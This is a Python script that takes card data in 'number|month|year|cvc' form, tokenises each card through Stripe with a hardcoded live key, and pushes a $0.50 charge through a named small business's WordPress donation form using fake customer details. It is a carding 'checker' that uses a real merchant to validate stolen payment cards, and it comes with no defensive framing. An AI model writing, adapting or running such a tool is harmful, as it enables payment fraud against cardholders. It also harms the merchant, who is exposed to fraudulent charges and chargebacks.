import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51P5LI9KayPYUFJiGIWTivOjJvRbBpGADax8UCHC7Lq7qsGyYCB7qPe1VehByUMxJToyJjBKXgDoUgkpw7r2WRYxB00QMBRc4zu'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']

	cookies = {
    '__stripe_mid': 'a5b27f8d-8299-409a-8778-cb5762b81ee0e1d17d',
    '__stripe_sid': '8af89e1e-9b83-47b2-86d0-9dd6d397be82613380',
}
	
	headers = {
    'authority': 'geekelectricians.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '__stripe_mid=a5b27f8d-8299-409a-8778-cb5762b81ee0e1d17d; __stripe_sid=8af89e1e-9b83-47b2-86d0-9dd6d397be82613380',
    'origin': 'https://geekelectricians.com',
    'referer': 'https://geekelectricians.com/secured-payment/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}
	
	params = {
    't': '1731410420223',
}

	data = {
    	'data': '__fluent_form_embded_post_id=2852&_fluentform_6_fluentformnonce=a6137f0742&_wp_http_referer=%2Fsecured-payment%2F&names%5Bfirst_name%5D=Niko&names%5Blast_name%5D=&email=bohtoobb%40gmail.com&phone=&input_text=88388&custom-payment-amount=0.5&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
    'action': 'fluentform_submit',
    'form_id': '6',
}

	r2 = requests.post(
    'https://geekelectricians.com/wp-admin/admin-ajax.php',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
)
	
	return (r2.json())
